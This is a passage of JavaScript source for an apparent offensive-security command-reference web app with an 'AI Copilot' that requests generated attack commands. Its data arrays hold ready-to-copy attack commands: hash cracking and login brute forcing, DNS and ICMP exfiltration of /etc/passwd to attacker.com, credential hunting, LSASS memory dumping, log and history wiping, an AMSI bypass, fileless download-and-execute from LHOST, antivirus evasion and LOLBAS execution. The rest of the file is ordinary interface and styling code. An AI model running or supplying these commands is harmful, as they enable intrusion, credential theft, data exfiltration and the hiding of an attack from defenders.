                { name: 'Proxychains', cmd: 'proxychains nmap -sT -Pn TARGET', tags: ['proxychains', 'pivot'], desc: 'Proxy through SOCKS' }
            ]
        },
        {
            id: 'crack',
            name: 'Password Cracking',
            nameAr: 'كسر كلمات المرور',
            icon: 'fa-key',
            color: '#c0392b',
            commands: [
                // Hashcat
                { name: 'Hashcat MD5', cmd: 'hashcat -m 0 hash.txt rockyou.txt', tags: ['hashcat', 'md5'], desc: 'Crack MD5' },
                { name: 'Hashcat SHA256', cmd: 'hashcat -m 1400 hash.txt rockyou.txt', tags: ['hashcat', 'sha256'], desc: 'Crack SHA256' },
                { name: 'Hashcat NTLM', cmd: 'hashcat -m 1000 hash.txt rockyou.txt', tags: ['hashcat', 'ntlm'], desc: 'Crack NTLM' },
                { name: 'Hashcat NetNTLMv2', cmd: 'hashcat -m 5600 hash.txt rockyou.txt', tags: ['hashcat', 'netntlm'], desc: 'Crack NetNTLMv2' },
                { name: 'Hashcat Kerberos', cmd: 'hashcat -m 13100 hash.txt rockyou.txt', tags: ['hashcat', 'krb5tgs'], desc: 'Crack TGS' },
                { name: 'Hashcat AS-REP', cmd: 'hashcat -m 18200 hash.txt rockyou.txt', tags: ['hashcat', 'asrep'], desc: 'Crack AS-REP' },
                { name: 'Hashcat bcrypt', cmd: 'hashcat -m 3200 hash.txt rockyou.txt', tags: ['hashcat', 'bcrypt'], desc: 'Crack bcrypt' },
                { name: 'Hashcat Rules', cmd: 'hashcat -m 0 hash.txt rockyou.txt -r best64.rule', tags: ['hashcat', 'rules'], desc: 'With rules' },
                // John
                { name: 'John Default', cmd: 'john hash.txt --wordlist=rockyou.txt', tags: ['john', 'default'], desc: 'John with wordlist' },
                { name: 'John Show', cmd: 'john hash.txt --show', tags: ['john', 'show'], desc: 'Show cracked' },
                { name: 'John Unshadow', cmd: 'unshadow passwd shadow > unshadowed.txt', tags: ['john', 'unshadow'], desc: 'Combine passwd/shadow' },
                { name: 'SSH2John', cmd: 'ssh2john id_rsa > hash.txt', tags: ['john', 'ssh'], desc: 'Convert SSH key' },
                { name: 'Zip2John', cmd: 'zip2john file.zip > hash.txt', tags: ['john', 'zip'], desc: 'Convert ZIP' },
                // Hydra
                { name: 'Hydra SSH', cmd: 'hydra -l USER -P rockyou.txt TARGET ssh', tags: ['hydra', 'ssh'], desc: 'Bruteforce SSH' },
                { name: 'Hydra FTP', cmd: 'hydra -l USER -P rockyou.txt TARGET ftp', tags: ['hydra', 'ftp'], desc: 'Bruteforce FTP' },
                { name: 'Hydra HTTP POST', cmd: 'hydra -l USER -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', tags: ['hydra', 'http'], desc: 'Bruteforce web login' },
                { name: 'Hydra SMB', cmd: 'hydra -l USER -P rockyou.txt TARGET smb', tags: ['hydra', 'smb'], desc: 'Bruteforce SMB' }
            ]
        },
        {
            id: 'postexp',
            name: 'Post-Exploitation',
            nameAr: 'ما بعد الاختراق',
            icon: 'fa-user-secret',
            color: '#9b59b6',
            commands: [
                // Data Exfil
                { name: 'Base64 Exfil', cmd: 'cat /etc/passwd | base64 -w0', tags: ['exfil', 'base64'], desc: 'Base64 encode for exfil' },
                { name: 'DNS Exfil', cmd: 'cat /etc/passwd | xxd -p | tr -d "\\n" | fold -w 60 | xargs -I{} host {}.attacker.com', tags: ['exfil', 'dns'], desc: 'DNS tunnel data' },
                { name: 'ICMP Exfil', cmd: 'xxd -p -c 16 file.txt | while read line; do ping -c 1 -p $line attacker.com; done', tags: ['exfil', 'icmp'], desc: 'ICMP data exfil' },
                // Credential Hunting
                { name: 'Find Passwords', cmd: 'grep -r "password" /var/www /home /etc 2>/dev/null', tags: ['creds', 'find'], desc: 'Search for passwords' },
                { name: 'Find Config Files', cmd: 'find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null', tags: ['creds', 'config'], desc: 'Find config files' },
                { name: 'MySQL History', cmd: 'cat ~/.mysql_history', tags: ['creds', 'mysql'], desc: 'MySQL command history' },
                { name: 'Git Secrets', cmd: 'git log -p | grep -E "(password|api_key|secret)"', tags: ['creds', 'git'], desc: 'Search git history' },
                { name: 'Env Variables', cmd: 'env | grep -iE "(pass|key|secret|token|api)"', tags: ['creds', 'env'], desc: 'Environment secrets' },
                { name: 'Chrome Creds', cmd: 'python3 /opt/chisel/chrome_decrypt.py', tags: ['creds', 'browser'], desc: 'Chrome passwords' },
                // Memory Dump
                { name: 'ProcDump', cmd: 'procdump -ma lsass.exe lsass.dmp', tags: ['memory', 'lsass'], desc: 'Dump LSASS memory' },
                { name: 'Minidump', cmd: 'rundll32.exe comsvcs.dll MiniDump PID lsass.dmp full', tags: ['memory', 'comsvcs'], desc: 'LSASS minidump' },
                { name: 'Pypykatz', cmd: 'pypykatz lsa minidump lsass.dmp', tags: ['memory', 'pypykatz'], desc: 'Parse minidump' },
                // Cleanup
                { name: 'Clear History', cmd: 'history -c; export HISTSIZE=0; unset HISTFILE', tags: ['cleanup', 'history'], desc: 'Clear bash history' },
                { name: 'Clear Logs', cmd: 'echo > /var/log/auth.log; echo > /var/log/secure', tags: ['cleanup', 'logs'], desc: 'Clear auth logs' },
                { name: 'Timestomp', cmd: 'touch -r /bin/ls malicious_file', tags: ['cleanup', 'time'], desc: 'Modify timestamps' }
            ]
        },
        {
            id: 'evasion',
            name: 'Evasion & OPSEC',
            nameAr: 'التخفي',
            icon: 'fa-eye-slash',
            color: '#607d8b',
            commands: [
                // Payload Obfuscation
                { name: 'Base64 Payload', cmd: 'echo "payload" | base64 | base64 -d | bash', tags: ['obfuscate', 'base64'], desc: 'Base64 execute' },
                { name: 'Hex Payload', cmd: 'echo "6964" | xxd -r -p | bash', tags: ['obfuscate', 'hex'], desc: 'Hex decode exec' },
                { name: 'Gzip Payload', cmd: 'echo "H4sIAAA..." | base64 -d | gzip -d | bash', tags: ['obfuscate', 'gzip'], desc: 'Compressed payload' },
                { name: 'PS AMSI Bypass', cmd: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', tags: ['bypass', 'amsi'], desc: 'Disable AMSI' },
                { name: 'PS Memory Only', cmd: 'IEX (New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")', tags: ['bypass', 'fileless'], desc: 'Fileless exec' },
                // AV Evasion
                { name: 'UPX Pack', cmd: 'upx -9 payload.exe -o packed.exe', tags: ['av', 'pack'], desc: 'UPX packer' },
                { name: 'Veil Payload', cmd: 'veil -t Evasion -p python/meterpreter/rev_tcp --ip LHOST --port LPORT', tags: ['av', 'veil'], desc: 'Veil framework' },
                { name: 'Shellter Inject', cmd: 'shellter -a -f payload.exe', tags: ['av', 'shellter'], desc: 'Inject into PE' },
                // Network Evasion
                { name: 'SSH over DNS', cmd: 'ssh -o ProxyCommand="socat - SOCKS4A:localhost:%h:%p,socksport=1080" user@target', tags: ['tunnel', 'dns'], desc: 'SSH via DNS' },
                { name: 'HTTP Tunnel', cmd: 'htunnel -F 8080:localhost:22', tags: ['tunnel', 'http'], desc: 'HTTP tunnel' },
                { name: 'DNS Tunnel', cmd: 'dnscat2 --dns domain=attacker.com', tags: ['tunnel', 'dnscat'], desc: 'DNScat tunnel' },
                { name: 'ICMP Tunnel', cmd: 'icmpsh -t TARGET -d 500 -s 128', tags: ['tunnel', 'icmp'], desc: 'ICMP shell' },
                // Living Off the Land
                { name: 'MSBuild Exec', cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.csproj', tags: ['lolbas', 'msbuild'], desc: 'MSBuild exec' },
                { name: 'InstallUtil', cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false payload.exe', tags: ['lolbas', 'installutil'], desc: 'InstallUtil bypass' },
                { name: 'Regsvr32 SCT', cmd: 'regsvr32 /s /n /u /i:http://LHOST/file.sct scrobj.dll', tags: ['lolbas', 'regsvr32'], desc: 'Regsvr32 exec' },
                { name: 'Mshta Exec', cmd: 'mshta http://LHOST/payload.hta', tags: ['lolbas', 'mshta'], desc: 'Mshta exec' },
                { name: 'Rundll32 JS', cmd: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("calc.exe")', tags: ['lolbas', 'rundll32'], desc: 'Rundll32 JS' },
                { name: 'Wmic Exec', cmd: 'wmic process call create "calc.exe"', tags: ['lolbas', 'wmic'], desc: 'WMIC process create' }
            ]
        }
    ],

    // === PRO STATE ===
    searchQuery: '',
    activeCategory: 'all',
    favorites: JSON.parse(localStorage.getItem('cmd_favorites') || '[]'),
    paramValues: {}, // Stores user inputs for placeholders like TARGET, LPORT
    aiMode: false,

    // === AI HEURISTICS ===
    aiNotions: {
        'pivot': ['ssh', 'chisel', 'ligolo', 'socat', 'tunnel'],
        'lateral': ['psexec', 'wmi', 'smb', 'winrm', 'ssh'],
        'transfer': ['wget', 'curl', 'certutil', 'scp', 'ftp'],
        'listen': ['nc', 'socat', 'pwncat', 'handler'],
        'enumerate': ['nmap', 'enum', 'recon', 'scan'],
        'crack': ['hashcat', 'john', 'hydra'],
        'bypass': ['amsi', 'obfuscate', 'encode', 'evasion']
    },

    // --- MAIN RENDER ---
    render() {
        const filtered = this.getFilteredCommands();
        const totalCommands = this.categories.reduce((sum, c) => sum + c.commands.length, 0);

        return `
        <div class="cmdref-app fade-in">
            <div class="cr-sidebar">
                <div class="cr-brand">
                    <i class="fas fa-terminal"></i> CmdRef <span class="pro-tag">PRO</span>
                </div>
                
                <div class="cr-nav">
                    <div class="nav-item ${this.activeCategory === 'all' && !this.aiMode ? 'active' : ''}" onclick="CommandRef.setCategory('all')">
                        <i class="fas fa-layer-group"></i> All Commands
                    </div>
                     <div class="nav-item ${this.activeCategory === 'favorites' ? 'active' : ''}" onclick="CommandRef.setCategory('favorites')">
                        <i class="fas fa-star"></i> Favorites
                    </div>
                </div>

                <div class="cr-nav-header">CATEGORIES</div>
                <div class="cr-categories">
                    ${this.categories.filter(c => c).map(c => `
                        <div class="cat-item ${this.activeCategory === c.id ? 'active' : ''}" onclick="CommandRef.setCategory('${c.id}')" style="--cat-color: ${c.color}">
                            <i class="fas ${c.icon || 'fa-flask'}"></i> ${c.name}
                            <span class="cat-badge">${c.commands ? c.commands.length : 0}</span>
                        </div>
                    `).join('')}
                </div>
            </div>

            <div class="cr-main">
                <div class="cr-topbar">
                    <div class="ai-search-box ${this.aiMode ? 'ai-active' : ''}">
                        <i class="fas ${this.aiMode ? 'fa-robot' : 'fa-search'}"></i>
                        <input type="text" 
                            placeholder="${this.aiMode ? 'Ask AI: I need to pivot using ssh...' : 'Search commands, tags, or description...'}" 
                            value="${this.searchQuery}" 
                            onkeydown="if(event.key==='Enter') CommandRef.handleSearch(this.value)"
                            onfocus="this.parentElement.classList.add('focused')"
                            onblur="this.parentElement.classList.remove('focused')"
                        >
                        ${this.searchQuery ? '<i class="fas fa-times clear-btn" onclick="CommandRef.clearSearch()"></i>' : ''}
                    </div>
                    <button class="ai-toggle-btn ${this.aiMode ? 'active' : ''}" onclick="CommandRef.toggleAI()">
                        <i class="fas fa-magic"></i> AI Copilot
                    </button>
                </div>

                <div class="cr-content">
                    ${this.renderParamBar()}
                    
                    <div class="cmd-grid">
                        ${filtered.length > 0 ? filtered.map(c => this.renderCommandCard(c)).join('') : this.renderEmptyState()}
                    </div>
                </div>
            </div>
        </div>
        ${this.getStyles()}
        `;
    },

    renderParamBar() {
        // Detect most common params in visible commands to show quick setters
        // For now, hardcode the most popular ones for the "Universal Replacer"
        return `
            <div class="param-bar">
                <div class="param-title"><i class="fas fa-sliders-h"></i> Universal Parameters</div>
                <div class="param-inputs">
                    ${this.renderParamInput('TARGET', 'IP/Domain')}
                    ${this.renderParamInput('LHOST', 'Attacker IP')}
                    ${this.renderParamInput('LPORT', 'Port')}
                    ${this.renderParamInput('USER', 'Username')}
                    ${this.renderParamInput('PASS', 'Password')}
                </div>
            </div>
        `;
    },

    renderParamInput(key, placeholder) {
        return `
            <div class="param-group">
                <span class="param-label">${key}</span>
                <input type="text" 
                    value="${this.paramValues[key] || ''}" 
                    placeholder="${placeholder}"
                    onkeydown="if(event.key==='Enter') CommandRef.updateParam('${key}', this.value)"
                >
            </div>
        `;
    },

    renderCommandCard(cmd) {
        let category = this.categories.find(c => c.commands.includes(cmd));

        // Helper fallback for AI or uncategorized commands
        if (!category) {
            category = {
                name: 'AI Generated',
                color: '#a855f7',
                icon: 'fa-robot'
            };
        }

        const color = category.color;
        const isFav = this.favorites.includes(cmd.name);

        // Process Command with Parameters
        let finalCmd = cmd.cmd;
        Object.keys(this.paramValues).forEach(key => {
            if (this.paramValues[key]) {
                const regex = new RegExp(key, 'g');
                finalCmd = finalCmd.replace(regex, this.paramValues[key]);
            }
        });

        // Highlight changed params in the preview?
        // Simple escape for now
        const escapedCmd = this.escapeHtml(finalCmd);

        return `
        <div class="cmd-card fade-in-up" style="--accent: ${color}">
            <div class="card-head">
                <div class="card-title">
                    <i class="fas ${category.icon || 'fa-terminal'}" style="color: ${color}"></i>
                    ${cmd.name}
                </div>
                <div class="card-actions">
                    <button class="action-btn ${isFav ? 'fav-active' : ''}" onclick="CommandRef.toggleFav('${cmd.name}')">
                        <i class="${isFav ? 'fas' : 'far'} fa-star"></i>
                    </button>
                    <button class="action-btn copy-btn" onclick="CommandRef.copyToClip(this, \`${escapedCmd.replace(/`/g, '\\`')}\`)">
                        <i class="far fa-copy"></i>
                    </button>
                </div>
            </div>
            
            <div class="cmd-preview">
                <code>${escapedCmd}</code>
            </div>

            <div class="card-meta">
                <div class="cmd-desc">${cmd.desc}</div>
                <div class="cmd-tags">
                    ${cmd.tags.map(t => `<span class="tag">${t}</span>`).join('')}
                </div>
            </div>
        </div>`;
    },

    renderEmptyState() {
        return `
            <div class="empty-state">
                <div class="empty-icon"><i class="fas fa-robot"></i></div>
                <h3>No commands found</h3>
                <p>Try adjusting your search or ask the AI Copilot for help.</p>
            </div>
        `;
    },

    // --- LOGIC ---
    async handleSearch(val) {
        this.searchQuery = val;

        if (this.aiMode && val.length > 5 && event.key === 'Enter') {
            // Real AI Generation
            const grid = document.querySelector('.cmd-grid');
            grid.innerHTML = `
                <div class="empty-state">
                    <div class="empty-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
                    <h3>Consulting Neural Network...</h3>
                    <p>Translating "${val}" into executable syntax.</p>
                </div>
            `;

            try {
                const res = await fetch('http://localhost:5000/api/ai/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ query: val })
                });
                const data = await res.json();

                if (data.success) {
                    // Inject the generated command as a temporary "result"
                    this.generatedCommand = data.command;
                    this.reRender();
                } else {
                    throw new Error(data.error);
                }
            } catch (e) {
                console.error(e);
                grid.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon" style="color: #ef4444"><i class="fas fa-exclamation-triangle"></i></div>
                        <h3>Neural Link Failed</h3>
                        <p>${e.message}</p>
                    </div>
                `;
            }
        } else {
            this.generatedCommand = null;
            this.reRender();
        }
    },

    toggleAI() {
        this.aiMode = !this.aiMode;
        if (this.aiMode) {
            this.activeCategory = 'all';
            this.searchQuery = ''; // Clear search when entering AI mode
        }
        this.generatedCommand = null;
        this.reRender();
    },

    setCategory(id) {
        this.activeCategory = id;
        this.aiMode = false;
        this.generatedCommand = null;
        this.reRender();
    },

    clearSearch() {
        this.searchQuery = '';
        this.generatedCommand = null;
        this.reRender();
    },

    updateParam(key, val) {
        this.paramValues[key] = val;
        this.reRender(); // Re-render to update all command previews live
    },

    toggleFav(name) {
        if (this.favorites.includes(name)) {
            this.favorites = this.favorites.filter(n => n !== name);
        } else {
            this.favorites.push(name);
        }
        localStorage.setItem('cmd_favorites', JSON.stringify(this.favorites));
        this.reRender();
    },

    getFilteredCommands() {
        // If we have a generated command from AI, show ONLY that
        if (this.aiMode && this.generatedCommand) {
            return [{
                name: 'AI Generated Solution',
                cmd: this.generatedCommand.cmd,
                tags: this.generatedCommand.tags || ['ai', 'generated'],
                desc: this.generatedCommand.desc || ' dynamically generated by AI'
            }];
        }

        let cmds = [];

        // 1. Filter by Category
        if (this.activeCategory === 'favorites') {
            this.categories.forEach(c => {
                cmds = cmds.concat(c.commands.filter(cmd => this.favorites.includes(cmd.name)));
            });
        } else if (this.activeCategory === 'all') {
            this.categories.forEach(c => cmds = cmds.concat(c.commands));
        } else {
            const cat = this.categories.find(c => c.id === this.activeCategory);
            if (cat) cmds = cat.commands;
        }

        // 2. Filter by Search (Standard)
        if (this.searchQuery && !this.aiMode) {
            const q = this.searchQuery.toLowerCase();
            cmds = cmds.filter(c =>
                c.name.toLowerCase().includes(q) ||
                c.cmd.toLowerCase().includes(q) ||
                c.tags.some(t => t.toLowerCase().includes(q)) ||
                c.desc.toLowerCase().includes(q)
            );
        }

        return cmds;
    },

    copyToClip(btn, text) {
        navigator.clipboard.writeText(text);
        const icon = btn.querySelector('i');
        icon.className = 'fas fa-check';
        setTimeout(() => icon.className = 'far fa-copy', 1500);
    },

    escapeHtml(str) {
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    },

    reRender() {
        const app = document.querySelector('.cmdref-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .cmdref-app { display: flex; height: calc(100vh - 60px); background: #0f0f13; font-family: 'Segoe UI', sans-serif; overflow: hidden; color: #e0e0e0; }
            
            /* SIDEBAR */
            .cr-sidebar { width: 260px; background: #14141c; border-right: 1px solid #2d2d3a; display: flex; flex-direction: column; flex-shrink: 0; }
            .cr-brand { padding: 20px; font-size: 1.2rem; font-weight: bold; color: #fff; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #2d2d3a; }
            .pro-tag { background: linear-gradient(135deg, #f59e0b, #d97706); color: #000; font-size: 0.7rem; padding: 2px 6px; border-radius: 4px; }
            
            .cr-nav { padding: 15px; display: flex; flex-direction: column; gap: 5px; }
            .cr-nav-header { padding: 15px 20px 5px; color: #666; font-size: 0.75rem; font-weight: bold; letter-spacing: 1px; }
            .cr-categories { flex: 1; overflow-y: auto; padding: 10px 15px; display: flex; flex-direction: column; gap: 5px; }
            
            .nav-item, .cat-item { padding: 10px 15px; border-radius: 8px; cursor: pointer; color: #a0a0a0; display: flex; align-items: center; gap: 10px; font-size: 0.9rem; transition: 0.2s; }
            .nav-item:hover, .cat-item:hover { background: #1f1f29; color: #fff; }
            .nav-item.active, .cat-item.active { background: #252530; color: #fff; font-weight: 500; }
            .cat-item.active { border-left: 3px solid var(--cat-color); background: linear-gradient(90deg, #252530, transparent); }
            .cat-badge { margin-left: auto; background: #000; padding: 2px 6px; border-radius: 10px; font-size: 0.7rem; color: #666; }
            
            /* MAIN CONTENT */
            .cr-main { flex: 1; display: flex; flex-direction: column; min-width: 0; }
            
            .cr-topbar { padding: 15px 25px; border-bottom: 1px solid #2d2d3a; display: flex; gap: 15px; align-items: center; background: #14141c; }
            .ai-search-box { flex: 1; position: relative; display: flex; align-items: center; background: #0a0a10; border: 1px solid #333; border-radius: 8px; padding: 0 15px; transition: 0.3s; }
            .ai-search-box.focused { border-color: #6366f1; box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2); }
            .ai-search-box.ai-active { border-color: #a855f7; box-shadow: 0 0 10px rgba(168, 85, 247, 0.2); }
            .ai-search-box input { flex: 1; background: transparent; border: none; padding: 12px 10px; color: #fff; font-size: 0.95rem; outline: none; }
            .clear-btn { cursor: pointer; color: #666; } .clear-btn:hover { color: #fff; }
            
            .ai-toggle-btn { padding: 8px 16px; border-radius: 8px; border: 1px solid #333; background: #1f1f29; color: #aaa; cursor: pointer; display: flex; align-items: center; gap: 8px; font-weight: 500; transition: 0.2s; }
            .ai-toggle-btn.active { background: linear-gradient(135deg, #a855f7, #7c3aed); color: #fff; border-color: transparent; box-shadow: 0 0 10px rgba(168, 85, 247, 0.4); }
            
            .cr-content { flex: 1; overflow-y: auto; padding: 25px; display: flex; flex-direction: column; gap: 20px; }
            
            /* PARAMETER BAR */
            .param-bar { background: #181820; border: 1px solid #2d2d3a; border-radius: 10px; padding: 15px; margin-bottom: 5px; }
            .param-title { color: #888; font-size: 0.8rem; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; font-weight: bold; text-transform: uppercase; }
            .param-inputs { display: flex; gap: 15px; flex-wrap: wrap; }
            .param-group { display: flex; flex-direction: column; gap: 4px; flex: 1; min-width: 140px; }
            .param-label { color: #6366f1; font-size: 0.75rem; font-weight: bold; }
            .param-group input { background: #0a0a10; border: 1px solid #333; padding: 6px 10px; border-radius: 6px; color: #fff; font-family: monospace; font-size: 0.9rem; }
            .param-group input:focus { border-color: #6366f1; outline: none; }

            /* COMMAND GRID */
            .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; padding-bottom: 40px; }
            
            .cmd-card { background: #181820; border: 1px solid #2d2d3a; border-radius: 10px; padding: 15px; position: relative; display: flex; flex-direction: column; gap: 12px; transition: 0.2s; }
            .cmd-card:hover { transform: translateY(-3px); border-color: var(--accent); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
            .cmd-card::before { content: ''; position: absolute; left: 0; top: 15px; bottom: 15px; width: 3px; background: var(--accent); border-radius: 0 4px 4px 0; }
            
            .card-head { display: flex; justify-content: space-between; align-items: center; padding-left: 10px; }
            .card-title { font-weight: 600; color: #fff; font-size: 0.95rem; display: flex; align-items: center; gap: 10px; }
            .card-actions { display: flex; gap: 5px; }
            .action-btn { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; border: none; background: transparent; color: #666; cursor: pointer; transition: 0.2s; }
            .action-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
            .fav-active { color: #f59e0b; }
            
            .cmd-preview { background: #0a0a10; padding: 12px; border-radius: 6px; border: 1px solid #2d2d3a; margin-left: 10px; }
            .cmd-preview code { color: #2ecc71; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; word-break: break-all; }
            
            .card-meta { margin-left: 10px; display: flex; flex-direction: column; gap: 8px; }
            .cmd-desc { font-size: 0.85rem; color: #888; }
            .cmd-tags { display: flex; gap: 6px; flex-wrap: wrap; }
            .tag { font-size: 0.7rem; background: #23232e; color: #aaa; padding: 2px 8px; border-radius: 4px; }
            
            .empty-state { grid-column: 1 / -1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px; color: #444; }
            .empty-icon { font-size: 3rem; margin-bottom: 20px; color: #333; }

            .fade-in { animation: fadeIn 0.3s ease-out; }
            .fade-in-up { animation: fadeInUp 0.4s ease-out; }
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
            
            @media (max-width: 900px) { .cmdref-app { flex-direction: column; overflow-y: auto; } .cr-sidebar { width: 100%; height: auto; } }
        </style>`;
    }
};

function pageCommandRef() {
    return CommandRef.render();
}
